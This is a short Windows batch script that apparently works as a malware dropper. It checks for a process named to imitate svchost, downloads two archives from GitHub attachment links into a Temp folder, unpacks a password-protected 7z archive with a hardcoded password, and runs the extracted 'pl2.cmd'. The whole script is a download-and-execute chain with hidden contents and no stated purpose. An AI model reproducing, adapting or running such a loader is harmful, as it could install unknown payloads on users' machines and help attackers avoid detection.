
tasklist /fi "windowtitle eq app" | findstr /i "app" >nul
if %errorlevel%==0 exit
title app

tasklist /fi "imagename eq svchostq.exe" | findstr /i "svchostq.exe" >nul
if %errorlevel%==0 exit

mkdir "%localappdata%\Temp\appv1"
cd "%localappdata%\Temp\appv1"
curl -L -o"7z.zip" "https://github.com/user-attachments/files/22734685/7z.zip"
curl -L -o"a.zip" "https://github.com/user-attachments/files/22734686/a.zip"
tar -xf "7z.zip"
tar -xf "a.zip"
start "" "7z\7za.exe" x a.7z -p"dCkJGdS*6888Bm1P" -y
timeout /t 4
taskkill /f /im 7za.exe
pl2.cmd


cmd /k
